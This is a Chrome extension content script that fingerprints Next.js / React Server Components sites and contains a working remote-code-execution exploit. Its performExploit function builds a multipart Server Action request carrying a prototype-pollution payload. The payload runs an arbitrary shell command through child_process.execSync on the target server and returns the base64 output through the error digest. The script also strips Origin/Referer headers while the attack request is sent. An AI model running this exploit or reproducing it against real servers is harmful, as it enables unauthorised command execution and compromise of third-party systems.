// content.js

// === 1. 被动检测 ===
function performPassiveScan() {
    let score = 0;
    let details = [];
    const html = document.documentElement.outerHTML;

    if (document.contentType === "text/x-component") {
        score += 100;
        details.push("Found: Content-Type text/x-component");
    }
    if (/(window|self)\.__next_f\s*=/.test(html)) {
        score += 80;
        details.push("Found: window.__next_f (App Router)");
    }
    if (html.includes("react-server-dom-webpack")) {
        score += 30;
        details.push("Found: react-server-dom-webpack");
    }
    return { isRSC: score >= 50, details: details };
}

// === 2. 主动指纹 ===
async function performFingerprint() {
    try {
        const res = await fetch(window.location.href, {
            method: 'GET',
            headers: { 'RSC': '1' }
        });
        
        let details = [];
        const cType = res.headers.get('Content-Type') || "";
        const vary = res.headers.get('Vary') || "";
        const text = await res.text();

        if (cType.includes('text/x-component')) details.push("Response Content-Type became text/x-component");
        if (vary.includes('RSC')) details.push("Vary header contains 'RSC'");
        if (/^\d+:["IHL]/.test(text)) details.push("Body structure matches React Flight Protocol");

        return { detected: details.length > 0, details: details };
    } catch (e) {
        return { detected: false, details: ["Network Error"] };
    }
}

// === 3. RCE 漏洞利用 ===
async function performExploit(cmd) {
    // 默认命令
    const targetCmd = cmd || "echo vulnerability_test";
    
    // 构造 Payload，动态插入命令
    const payloadJson = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('${targetCmd}').toString('base64');throw Object.assign(new Error('x'),{digest: res});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;
    const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
    const bodyParts = [
        `--${boundary}`,
        'Content-Disposition: form-data; name="0"',
        '',
        payloadJson,
        `--${boundary}`,
        'Content-Disposition: form-data; name="1"',
        '',
        '"$@0"',
        `--${boundary}`,
        'Content-Disposition: form-data; name="2"',
        '',
        '[]',
        `--${boundary}--`,
        ''
    ].join('\r\n');

    const targetUrl = "/adfa"; // 使用相对路径

    try {
        // FIX: Enable the Origin/Referer-stripping rule ONLY for the duration of this
        // exploit fetch, then immediately remove it. Previously the rule lived in
        // rules.json and was always active, which stripped the Origin header from ALL
        // XHR requests on every site — breaking WebSocket handshakes on sites like
        // speedtest.net (causing "DOWNLOAD TEST ERROR: socket error").
        await new Promise(resolve =>
            chrome.runtime.sendMessage({ action: "exploit_start" }, resolve)
        );

        let res;
        try {
            res = await fetch(targetUrl, {
                method: 'POST',
                headers: {
                    'Next-Action': 'x',
                    'X-Nextjs-Request-Id': '7a3f9c1e',
                    'X-Nextjs-Html-Request-ld': '9bK2mPaRtVwXyZ3S@!sT7u',
                    'Content-Type': `multipart/form-data; boundary=${boundary}`,
                    'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9'
                },
                body: bodyParts
            });
        } finally {
            // Always remove the rule after the request, success or failure
            await new Promise(resolve =>
                chrome.runtime.sendMessage({ action: "exploit_end" }, resolve)
            );
        }

        const responseText = await res.text();

        // 正则提取 digest 的值
        const digestMatch = responseText.match(/"digest"\s*:\s*"((?:[^"\\]|\\.)*)"/);

        if (digestMatch && digestMatch[1]) {
            let rawBase64 = digestMatch[1];
            
            try {
                // 1. 先处理 JSON 字符串转义 (比如把 \" 变回 ")
                let cleanBase64 = JSON.parse(`"${rawBase64}"`);
                
                // 2. Base64 解码，支持 UTF-8 中文
                const decodedStr = new TextDecoder().decode(
                    Uint8Array.from(atob(cleanBase64), c => c.charCodeAt(0))
                );

                return { 
                    success: true, 
                    output: decodedStr 
                };
            } catch (parseError) {
                return { 
                    success: false, 
                    msg: "Decoding Error: " + parseError.message, 
                    debug: rawBase64 
                };
            }
        } else {
            return { 
                success: false, 
                msg: "Exploit Failed: 'digest' key not found.",
                debug: responseText.substring(0, 100) 
            };
        }

    } catch (e) {
        return { success: false, msg: "Network/Request Error: " + e.message };
    }
}

// === 消息监听与初始化 ===
const passiveData = performPassiveScan();
if(passiveData.isRSC) chrome.runtime.sendMessage({ action: "update_badge" });

chrome.runtime.onMessage.addListener((req, sender, sendResponse) => {
    if (req.action === "get_passive") sendResponse(passiveData);
    if (req.action === "run_fingerprint") {
        performFingerprint().then(res => sendResponse(res));
        return true;
    }
    if (req.action === "run_exploit") {
        performExploit(req.cmd).then(res => sendResponse(res));
        return true;
    }
});
